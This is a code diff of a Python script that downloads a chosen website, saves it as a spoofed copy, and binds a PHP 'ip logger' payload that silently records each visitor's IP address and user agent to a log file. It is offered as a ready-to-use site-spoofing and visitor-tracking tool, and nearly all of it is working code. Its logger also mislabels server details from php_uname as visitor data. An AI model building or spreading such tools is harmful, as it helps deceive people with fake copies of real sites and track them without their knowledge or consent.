@@ -1,19 +1,28 @@
-#!/usr/bin/python
+#!/usr/bin/env python
+debug = False;
+
+import webbrowser
 import urllib
 import time
 import os
 
+chromePath = ""
+# Set Google Chrome Path
+if os.name == "nt":
+    chromePath = r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe %s"
+elif os.name == "posix":
+    chromePath = "/usr/bin/chromium %s"
+
 # check if old file (spoofed.html) exists 
 fileName = 'spoofed.html'
-checkIfExist = os.path.isfile(fileName)
-
-# create spoofed.html if not exist
-if checkIfExist == 0:
-    open(fileName, "w")
+fileExists = os.path.isfile(fileName)
 
 # delete spoofed.html if exist (has old data as backup)
-if checkIfExist == 1:
+# create spoofed.html if not exist
+if fileExists:
     os.remove(fileName)
+else:
+    open(fileName, "w")
 
 try:
     print 'Enter website url to spoof e.g (http://google.com)\n'
@@ -21,13 +30,18 @@ try:
     print "\n"
     
 except IOError:
-    print "Must be used as http://yoursite.com"
-    system("pause")
+    print "Must be used as http://yoursite.com. Exiting."
+    exit(1)
 
 # download the website code
-os.system("cls") 
+#os.system("cls") 
 print 'Spoofing '+ url + ', this may take a few bananas' # didn't specify a unit of time here, so Matt W. decided to make it bananas
-urllib.urlretrieve (url, fileName)
+
+if urllib.urlretrieve (url, fileName):
+    if debug: print url + " -> " + fileName
+else:
+    if debug: print "Downloading url data failed. Exiting."
+    exit(1)
 
 # tell the user we finished
 print 'Download completed\n\n'
@@ -40,13 +54,22 @@ fileOpen.close()
 # choose what payloads to add to new webpage
 print 'Enter corresponding key to add payload:'
 print '[1] Add ip logger'
-payload = raw_input()
+payload = input()
 
 # ip logger payload
-if payload == '1':
-    ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agent:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
-    print '\nCreate new name for file: eg. (google)\n'
-    newFileName = raw_input() + '.php'
+if payload == 1:
+    ipLogger = """<?php
+$file="iplog.txt";
+$f=fopen($file,"a");
+fwrite($f,"-------------------------"."\n");
+fwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");
+fwrite($f,"User Agent:".$_SERVER["HTTP_USER_AGENT"]."\n");
+fwrite($f,"Host Name:".php_uname("n")."\n");
+fwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");
+fclose($f);
+?>"""
+
+    newFileName = raw_input("Create new name for file: eg. (google).php: ")
     print '\nBinding an ip logger to ' + newFileName
     
     makePage = open (newFileName, 'a') ## a will append, w will over-write
@@ -56,3 +79,6 @@ if payload == '1':
     print '\nBound payload(s) successfully! Exiting in 4 seconds...'
     os.remove(fileName)
     time.sleep(4)		       ## give user time to read
+
+    if chromePath != "": webbrowser.get(chromePath).open("spoofed.html")
+    else:                webbrowser.open("spoofed.html")
